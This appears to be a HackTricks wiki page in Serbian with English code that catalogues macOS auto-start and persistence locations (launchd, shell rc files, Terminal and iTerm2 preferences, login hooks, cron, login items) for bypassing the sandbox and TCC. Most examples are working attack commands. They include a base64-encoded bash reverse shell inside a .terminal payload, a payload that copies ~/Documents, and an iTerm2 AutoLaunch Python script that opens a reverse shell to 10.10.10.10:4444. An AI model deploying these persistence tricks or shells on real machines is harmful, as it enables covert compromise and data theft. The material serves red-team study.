# macOS Auto Start

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ovaj odeljak se u velikoj meri oslanja na seriju blogova [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), cilj je dodati **više lokacija za automatsko pokretanje** (ako je moguće), ukazati na **koje tehnike još uvek funkcionišu** danas sa najnovijom verzijom macOS-a (13.4) i precizirati **dozvole** koje su potrebne.

## Sandbox Bypass

{% hint style="success" %}
Ovde možete pronaći lokacije za pokretanje korisne za **sandbox bypass** koje vam omogućavaju da jednostavno izvršite nešto tako što ćete **to napisati u datoteku** i **čekati** na veoma **uobičajenu** **akciju**, određenu **količinu vremena** ili **akciju koju obično možete izvršiti** iznutra sandbox-a bez potrebe za root dozvolama.
{% endhint %}

### Launchd

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

* **`/Library/LaunchAgents`**
* **Okidač**: Ponovno pokretanje
* Potrebne root dozvole
* **`/Library/LaunchDaemons`**
* **Okidač**: Ponovno pokretanje
* Potrebne root dozvole
* **`/System/Library/LaunchAgents`**
* **Okidač**: Ponovno pokretanje
* Potrebne root dozvole
* **`/System/Library/LaunchDaemons`**
* **Okidač**: Ponovno pokretanje
* Potrebne root dozvole
* **`~/Library/LaunchAgents`**
* **Okidač**: Ponovno prijavljivanje
* **`~/Library/LaunchDemons`**
* **Okidač**: Ponovno prijavljivanje

{% hint style="success" %}
Kao zanimljiva činjenica, **`launchd`** ima ugrađenu listu svojstava u Mach-o sekciji `__Text.__config` koja sadrži druge dobro poznate usluge koje launchd mora pokrenuti. Štaviše, ove usluge mogu sadržati `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, što znači da moraju biti pokrenute i uspešno završene.

Naravno, ne može se modifikovati zbog potpisivanja koda.
{% endhint %}

#### Opis i Eksploatacija

**`launchd`** je **prvi** **proces** koji izvršava OX S kernel prilikom pokretanja i poslednji koji se završava prilikom gašenja. Uvek bi trebao imati **PID 1**. Ovaj proces će **pročitati i izvršiti** konfiguracije navedene u **ASEP** **plist-ovima** u:

* `/Library/LaunchAgents`: Agenti po korisniku instalirani od strane administratora
* `/Library/LaunchDaemons`: Daemoni na nivou sistema instalirani od strane administratora
* `/System/Library/LaunchAgents`: Agenti po korisniku koje pruža Apple.
* `/System/Library/LaunchDaemons`: Daemoni na nivou sistema koje pruža Apple.

Kada se korisnik prijavi, plist-ovi smešteni u `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` se pokreću sa **dozvolama prijavljenih korisnika**.

**Glavna razlika između agenata i daemona je ta što se agenti učitavaju kada se korisnik prijavi, a daemoni se učitavaju prilikom pokretanja sistema** (jer postoje usluge poput ssh koje treba izvršiti pre nego što bilo koji korisnik pristupi sistemu). Takođe, agenti mogu koristiti GUI dok daemoni moraju raditi u pozadini.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Postoje slučajevi kada **agent treba da se izvrši pre nego što se korisnik prijavi**, ovi se nazivaju **PreLoginAgents**. Na primer, ovo je korisno za pružanje asistivne tehnologije prilikom prijavljivanja. Mogu se naći i u `/Library/LaunchAgents`(vidi [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) primer).

{% hint style="info" %}
Nove konfiguracione datoteke za Daemons ili Agents će biti **učitane nakon sledećeg ponovnog pokretanja ili korišćenjem** `launchctl load <target.plist>` Takođe je **moguće učitati .plist datoteke bez te ekstenzije** sa `launchctl -F <file>` (međutim, te plist datoteke neće biti automatski učitane nakon ponovnog pokretanja).\
Takođe je moguće **isključiti** sa `launchctl unload <target.plist>` (proces na koji se ukazuje biće prekinut),

Da se **osigura** da ne postoji **ništa** (kao što je preklapanje) **što sprečava** **Agent** ili **Daemon** **da** **radi** pokrenite: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Prikazati sve agente i daemone učitane od strane trenutnog korisnika:
```bash
launchctl list
```
{% hint style="warning" %}
Ako je plist u vlasništvu korisnika, čak i ako se nalazi u sistemskim folderima daemona, **zadatak će biti izvršen kao korisnik** a ne kao root. Ovo može sprečiti neke napade eskalacije privilegija.
{% endhint %}

#### Više informacija o launchd

**`launchd`** je **prvi** proces korisničkog režima koji se pokreće iz **jezgra**. Pokretanje procesa mora biti **uspešno** i **ne može se zatvoriti ili srušiti**. Čak je i **zaštićen** od nekih **signala za ubijanje**.

Jedna od prvih stvari koje `launchd` radi je da **pokrene** sve **daemone** kao što su:

* **Daemoni tajmera** zasnovani na vremenu za izvršavanje:
* atd (`com.apple.atrun.plist`): Ima `StartInterval` od 30min
* crond (`com.apple.systemstats.daily.plist`): Ima `StartCalendarInterval` da se pokrene u 00:15
* **Mrežni daemoni** kao što su:
* `org.cups.cups-lpd`: Sluša na TCP (`SockType: stream`) sa `SockServiceName: printer`
* SockServiceName mora biti ili port ili usluga iz `/etc/services`
* `com.apple.xscertd.plist`: Sluša na TCP na portu 1640
* **Put daemoni** koji se izvršavaju kada se promeni određena putanja:
* `com.apple.postfix.master`: Proverava putanju `/etc/postfix/aliases`
* **IOKit notifikacijski daemoni**:
* `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach port:**
* `com.apple.xscertd-helper.plist`: Ukazuje u `MachServices` unosa na ime `com.apple.xscertd.helper`
* **UserEventAgent:**
* Ovo se razlikuje od prethodnog. Omogućava launchd-u da pokreće aplikacije kao odgovor na određene događaje. Međutim, u ovom slučaju, glavni binarni fajl koji je uključen nije `launchd` već `/usr/libexec/UserEventAgent`. Učitava dodatke iz SIP ograničenog foldera /System/Library/UserEventPlugins/ gde svaki dodatak ukazuje na svog inicijalizatora u `XPCEventModuleInitializer` ključa ili, u slučaju starijih dodataka, u `CFPluginFactories` rečniku pod ključem `FB86416D-6164-2070-726F-70735C216EC0` svog `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Korisno za zaobilaženje sandboxes: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Ali morate pronaći aplikaciju sa TCC zaobilaženjem koja izvršava shell koji učitava ove fajlove

#### Lokacije

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Okidač**: Otvorite terminal sa zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Okidač**: Otvorite terminal sa zsh
* Potreban root
* **`~/.zlogout`**
* **Okidač**: Izađite iz terminala sa zsh
* **`/etc/zlogout`**
* **Okidač**: Izađite iz terminala sa zsh
* Potreban root
* Potencijalno više u: **`man zsh`**
* **`~/.bashrc`**
* **Okidač**: Otvorite terminal sa bash
* `/etc/profile` (nije radilo)
* `~/.profile` (nije radilo)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Okidač**: Očekuje se da se aktivira sa xterm, ali **nije instaliran** i čak i nakon instalacije prikazuje se ova greška: xterm: `DISPLAY is not set`

#### Opis i eksploatacija

Kada se inicira shell okruženje kao što su `zsh` ili `bash`, **izvode se određeni startup fajlovi**. macOS trenutno koristi `/bin/zsh` kao podrazumevani shell. Ovaj shell se automatski pristupa kada se pokrene aplikacija Terminal ili kada se uređaj pristupi putem SSH. Dok su `bash` i `sh` takođe prisutni u macOS-u, moraju se eksplicitno pozvati da bi se koristili.

Man stranica za zsh, koju možemo pročitati sa **`man zsh`** ima dug opis startup fajlova.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponovo otvorene aplikacije

{% hint style="danger" %}
Konfigurisanje naznačenog iskorišćavanja i odjavljivanje i prijavljivanje ili čak ponovo pokretanje nije mi pomoglo da pokrenem aplikaciju. (Aplikacija nije bila pokrenuta, možda treba da bude aktivna kada se ove radnje izvrše)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Korisno za zaobilaženje sandboxes: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Okidač**: Ponovno pokretanje otvorenih aplikacija

#### Opis i iskorišćavanje

Sve aplikacije koje treba ponovo otvoriti su unutar plist-a `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Dakle, da ponovo otvorene aplikacije pokrenu vašu, samo treba da **dodate svoju aplikaciju na listu**.

UUID se može pronaći listanjem tog direktorijuma ili sa `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da proverite aplikacije koje će biti ponovo otvorene možete uraditi:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Da **dodate aplikaciju na ovu listu** možete koristiti:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Terminal koristi FDA dozvole korisnika koji ga koristi

#### Location

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Trigger**: Otvorite Terminal

#### Description & Exploitation

U **`~/Library/Preferences`** se čuvaju podešavanja korisnika u Aplikacijama. Neka od ovih podešavanja mogu sadržati konfiguraciju za **izvršavanje drugih aplikacija/skripti**.

Na primer, Terminal može izvršiti komandu pri pokretanju:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija se odražava u datoteci **`~/Library/Preferences/com.apple.Terminal.plist`** na sledeći način:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dakle, ako se plist podešavanja terminala u sistemu može prepisati, tada se **`open`** funkcionalnost može koristiti za **otvaranje terminala i ta komanda će biti izvršena**.

Možete to dodati iz CLI-a sa: 

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal skripte / Ostale ekstenzije datoteka

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Terminal se koristi za dobijanje FDA dozvola korisnika koji ga koristi

#### Lokacija

* **Bilo gde**
* **Okidač**: Otvorite Terminal

#### Opis i eksploatacija

Ako kreirate [**`.terminal`** skriptu](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i otvorite je, **Terminal aplikacija** će automatski biti pozvana da izvrši komande navedene u njoj. Ako Terminal aplikacija ima neke posebne privilegije (kao što je TCC), vaša komanda će biti izvršena sa tim posebnim privilegijama.

Isprobajte to sa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Možete takođe koristiti ekstenzije **`.command`**, **`.tool`**, sa sadržajem običnih shell skripti i one će takođe biti otvorene u Terminalu.

{% hint style="danger" %}
Ako terminal ima **Potpunu Disk Pristup**, moći će da izvrši tu akciju (napomena: izvršena komanda će biti vidljiva u terminal prozoru).
{% endhint %}

### Audio Pluginovi

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🟠](https://emojipedia.org/large-orange-circle)
* Možda ćete dobiti dodatni TCC pristup

#### Lokacija

* **`/Library/Audio/Plug-Ins/HAL`**
* Potreban root
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara
* **`/Library/Audio/Plug-ins/Components`**
* Potreban root
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara
* **`~/Library/Audio/Plug-ins/Components`**
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara
* **`/System/Library/Components`**
* Potreban root
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara

#### Opis

Prema prethodnim writeup-ima, moguće je **kompilirati neke audio pluginove** i učitati ih.

### QuickLook Pluginovi

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🟠](https://emojipedia.org/large-orange-circle)
* Možda ćete dobiti dodatni TCC pristup

#### Lokacija

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis & Eksploatacija

QuickLook pluginovi mogu biti izvršeni kada **pokrenete pregled datoteke** (pritisnite razmaknicu sa izabranom datotekom u Finder-u) i **plugin koji podržava taj tip datoteke** je instaliran.

Moguće je kompilirati svoj vlastiti QuickLook plugin, postaviti ga u jednu od prethodnih lokacija da bi ga učitali, a zatim otići do podržane datoteke i pritisnuti razmaknicu da ga pokrenete.

### ~~Login/Logout Hooks~~

{% hint style="danger" %}
Ovo nije radilo za mene, ni sa korisničkim LoginHook-om ni sa root LogoutHook-om
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Morate biti u mogućnosti da izvršite nešto poput `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Lo`cira se u `~/Library/Preferences/com.apple.loginwindow.plist`

Oni su zastareli, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ova postavka se čuva u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Da biste to obrisali:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
The root korisnik se čuva u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Uslovni zaobilaženje peskovnika

{% hint style="success" %}
Ovde možete pronaći lokacije za pokretanje korisne za **zaobilaženje peskovnika** koje vam omogućava da jednostavno izvršite nešto **upisivanjem u datoteku** i **očekivanjem ne tako uobičajenih uslova** kao što su specifični **instalirani programi, "neobične" korisničke** radnje ili okruženja.
{% endhint %}

### Cron

**Pisanje**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Korisno za zaobilaženje peskovnika: [✅](https://emojipedia.org/check-mark-button)
* Međutim, morate biti u mogućnosti da izvršite `crontab` binarni fajl
* Ili biti root
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root je potreban za direktan pristup pisanju. Nije potreban root ako možete izvršiti `crontab <file>`
* **Okidač**: Zavisi od cron posla

#### Opis i eksploatacija

Prikazivanje cron poslova **trenutnog korisnika** sa:
```bash
crontab -l
```
Možete takođe videti sve cron poslove korisnika u **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (potrebne su administratorske privilegije).

Na MacOS-u se nekoliko foldera koji izvršavaju skripte sa **određenom frekvencijom** može naći u:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Tamo možete pronaći redovne **cron** **poslove**, **at** **poslove** (koji se ne koriste često) i **periodične** **poslove** (koji se uglavnom koriste za čišćenje privremenih datoteka). Dnevni periodični poslovi mogu se izvršiti, na primer, sa: `periodic daily`.

Da biste programatski dodali **korisnički cronjob**, moguće je koristiti:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Korisno za zaobilaženje sandboxes: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 je imao dodeljene TCC dozvole

#### Lokacije

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Okidač**: Otvorite iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Okidač**: Otvorite iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Okidač**: Otvorite iTerm

#### Opis i Eksploatacija

Skripte smeštene u **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** biće izvršene. Na primer:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
или:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skripta **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** će takođe biti izvršena:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Podešavanja iTerm2 koja se nalaze u **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogu **ukazivati na komandu koja će se izvršiti** kada se iTerm2 terminal otvori.

Ova postavka može biti konfigurisana u iTerm2 podešavanjima:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

A komanda se odražava u podešavanjima:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Možete postaviti komandu za izvršavanje sa: 

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Veoma je verovatno da postoje **drugi načini za zloupotrebu iTerm2 podešavanja** za izvršavanje proizvoljnih komandi.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Korisno za zaobilaženje sandboxes: [✅](https://emojipedia.org/check-mark-button)
* Ali xbar mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za pristup

#### Lokacija

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Okidač**: Kada se xbar izvrši

#### Opis

Ako je popularni program [**xbar**](https://github.com/matryer/xbar) instaliran, moguće je napisati shell skriptu u **`~/Library/Application\ Support/xbar/plugins/`** koja će biti izvršena kada se xbar pokrene:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali Hammerspoon mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za pristup

#### Location

* **`~/.hammerspoon/init.lua`**
* **Trigger**: Kada se izvrši hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA skriptni jezik** za svoje operacije. Značajno, podržava integraciju kompletnog AppleScript koda i izvršavanje shell skripti, značajno poboljšavajući svoje skriptne mogućnosti.

Aplikacija traži jedan fajl, `~/.hammerspoon/init.lua`, i kada se pokrene, skripta će biti izvršena.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali BetterTouchTool mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za Automatizaciju-Prečice i Pristupačnost

#### Lokacija

* `~/Library/Application Support/BetterTouchTool/*`

Ovaj alat omogućava da se označe aplikacije ili skripte koje će se izvršiti kada se pritisnu određene prečice. Napadač bi mogao da konfiguriše svoju **prečicu i akciju za izvršavanje u bazi podataka** kako bi izvršio proizvoljan kod (prečica bi mogla biti samo pritisak na taster).

### Alfred

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali Alfred mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za Automatizaciju, Pristupačnost i čak Pristup celom disku

#### Lokacija

* `???`

Omogućava kreiranje radnih tokova koji mogu izvršavati kod kada su ispunjeni određeni uslovi. Potencijalno je moguće da napadač kreira datoteku radnog toka i natera Alfreda da je učita (potrebno je platiti premium verziju za korišćenje radnih tokova).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali ssh mora biti omogućen i korišćen
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* SSH koristi za FDA pristup

#### Lokacija

* **`~/.ssh/rc`**
* **Okidač**: Prijava putem ssh
* **`/etc/ssh/sshrc`**
* Potreban root
* **Okidač**: Prijava putem ssh

{% hint style="danger" %}
Da bi se uključio ssh, potrebna je dozvola za Pristup celom disku:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Opis i Eksploatacija

Po default-u, osim ako nije `PermitUserRC no` u `/etc/ssh/sshd_config`, kada se korisnik **prijavi putem SSH** skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** će biti izvršene.

### **Stvari za prijavu**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Korisno za zaobilaženje sandboxes: [✅](https://emojipedia.org/check-mark-button)
* Ali morate izvršiti `osascript` sa argumentima
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Okidač:** Prijava
* Eksploatacijski payload se čuva pozivajući **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Okidač:** Prijava
* Potreban root

#### Opis

U System Preferences -> Users & Groups -> **Stvari za prijavu** možete pronaći **stavke koje će biti izvršene kada se korisnik prijavi**.\
Moguće je da ih navedete, dodate i uklonite iz komandne linije:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ovi stavovi se čuvaju u datoteci **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Stvari za prijavu** mogu **takođe** biti označene korišćenjem API-ja [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) koji će sačuvati konfiguraciju u **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kao stavka za prijavu

(Pogledajte prethodni odeljak o stavkama za prijavu, ovo je ekstenzija)

Ako sačuvate **ZIP** datoteku kao **stavku za prijavu**, **`Archive Utility`** će je otvoriti i ako je zip, na primer, sačuvan u **`~/Library`** i sadrži folder **`LaunchAgents/file.plist`** sa backdoor-om, taj folder će biti kreiran (nije podrazumevano) i plist će biti dodat tako da će sledeći put kada se korisnik ponovo prijavi, **backdoor naznačen u plist-u biti izvršen**.

Druga opcija bi bila da se kreiraju datoteke **`.bash_profile`** i **`.zshenv`** unutar korisničkog HOME-a, tako da ako folder LaunchAgents već postoji, ova tehnika bi i dalje radila.

### At

Izveštaj: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
* Ali morate **izvršiti** **`at`** i mora biti **omogućeno**
